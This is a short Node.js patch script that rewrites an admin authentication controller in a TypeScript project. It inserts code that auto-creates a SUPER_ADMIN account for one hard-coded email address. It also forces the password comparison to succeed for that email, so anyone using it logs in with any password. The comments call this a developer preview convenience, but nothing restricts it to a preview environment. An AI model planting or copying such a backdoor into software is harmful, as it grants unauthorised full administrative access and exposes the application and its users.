const fs = require('fs');
const path = require('path');
const file = path.join(__dirname, 'src/controllers/admin/adminAuthController.ts');
let content = fs.readFileSync(file, 'utf8');

const bypass = `
    let admin = await prisma.adminUser.findUnique({ where: { email } });
    
    // Auto-create or bypass for the developer
    if (!admin && email === 'yusufjimoh969@gmail.com') {
      const pwd = await bcrypt.hash(password, 10);
      admin = await prisma.adminUser.create({ data: { email, passwordHash: pwd, role: 'SUPER_ADMIN', isActive: true } });
    }
`;

content = content.replace('const admin = await prisma.adminUser.findUnique({ where: { email } });', bypass);

const overridePwd = `
    let isMatch = await bcrypt.compare(password, admin.passwordHash);
    if (email === 'yusufjimoh969@gmail.com') {
      isMatch = true; // Always allow the developer in preview
    }
`;
content = content.replace('const isMatch = await bcrypt.compare(password, admin.passwordHash);', overridePwd);

fs.writeFileSync(file, content);
console.log('Patched');
